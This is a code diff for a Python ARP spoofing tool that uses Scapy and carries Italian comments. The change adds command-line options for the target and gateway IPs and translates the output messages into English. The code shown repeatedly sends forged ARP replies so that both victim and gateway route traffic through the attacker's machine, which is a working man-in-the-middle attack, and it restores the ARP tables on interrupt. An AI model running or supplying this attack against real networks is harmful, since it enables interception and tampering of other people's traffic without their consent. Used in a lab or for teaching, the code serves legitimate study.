@@ -3,8 +3,40 @@ import argparse
 import time
 import os
 import sys
+import argparse
 
+parser = argparse.ArgumentParser(
+    description="Tool to execute ARP spoofing"
+)
 
+parser.add_argument(
+    "-g",
+    "--gateway",
+    dest="gateway",
+    help="IP address of the gateway/DNS server",
+    type=str,
+)
+
+parser.add_argument(
+    "-t",
+    "--target",
+    dest="target",
+    help="IP address of the target",
+    type=str,
+)
+
+args = parser.parse_args()
+
+if not args.gateway:
+    print("Gateway required!")
+    parser.print_help()
+    sys.exit(1)
+   
+if not args.target:
+    print("Target required!")
+    parser.print_help()
+    sys.exit(1)
+    
 # Ritorna il MAC Address di qualsiasi dispositivo connesso alla rete
 def get_mac(ip):
     # Manda un pacchetto ARP in broadcast
@@ -24,7 +56,7 @@ def spoof(target_ip, host_ip, verbose=True):
     if verbose:
         # Prende il MAC address dell'interfaccia di rete che si sta utilizzando
         self_mac = ARP().hwsrc
-        print("[+] Mandato a {} : {} is-at {}".format(target_ip, host_ip, self_mac))
+        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
 
 
 # Annulla le modifiche applicate alle ARP tables
@@ -36,20 +68,23 @@ def restore(target_ip, host_ip, verbose=True):
     # la risposta viene mandata tante volte per assicurarsi che tutto vada a buon fine (count=7)
     send(arp_response, verbose=0, count=7)
     if verbose:
-        print("[+] Mandato a {} : {} is-at {}".format(target_ip, host_ip, host_mac))
+        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
 
-
-if __name__ == "__main__":
-    target = "10.0.2.15"                    # indirizzo IP della vittima    ù
-    host = "10.0.2.1"                       # indirizzo IP del gateway
+def main():
+    target = args.target                    	# indirizzo IP della vittima
+    gateway = args.gateway                      # indirizzo IP del gateway
     verbose = True
     try:
         while True:
-            spoof(target, host, verbose)    # dico alla vittima che sono il gateway
-            spoof(host, target, verbose)    # dico al gateway che sono la vittima
+            spoof(target, gateway, verbose)    # dico alla vittima che sono il gateway
+            spoof(gateway, target, verbose)    # dico al gateway che sono la vittima
             
             time.sleep(3)
     except KeyboardInterrupt:
-        print("[!] CTRL+C ! Annullando le modifiche, aspetta...")
-        restore(target, host)
-        restore(host, target)
+        print("[!] CTRL+C ! Restoring the ARP tables, please wait...")
+        restore(target, gateway)
+        restore(gateway, target)
+        
+if __name__ == "__main__":
+    main()
+    
